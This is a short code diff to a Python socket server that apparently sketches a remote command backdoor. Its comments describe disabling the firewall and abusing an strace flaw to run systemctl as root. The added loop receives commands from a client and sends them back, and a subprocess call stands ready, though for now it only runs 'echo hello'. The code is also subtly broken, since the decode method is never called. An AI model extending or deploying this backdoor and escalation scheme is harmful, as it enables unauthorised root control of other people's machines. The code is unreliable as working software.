@@ -1,5 +1,6 @@
 import socket
 import os
+import subprocess
 
 #disable firewall (cant connect w/o)
 #utilizes strace vuln to use systemctl as root
@@ -34,7 +35,11 @@ while True:
 
   # send a thank you message to the client. encoding to send byte type. 
   c.send('Thank you for connecting'.encode()) 
-
+  while True:
+      cmd = c.recv(1024).decode
+      result = subprocess.run(["echo", "hello"], capture_output=True, text=True)
+      c.send(("your command is" + cmd).encode())
+      
   # Close the connection with the client 
   c.close()
   
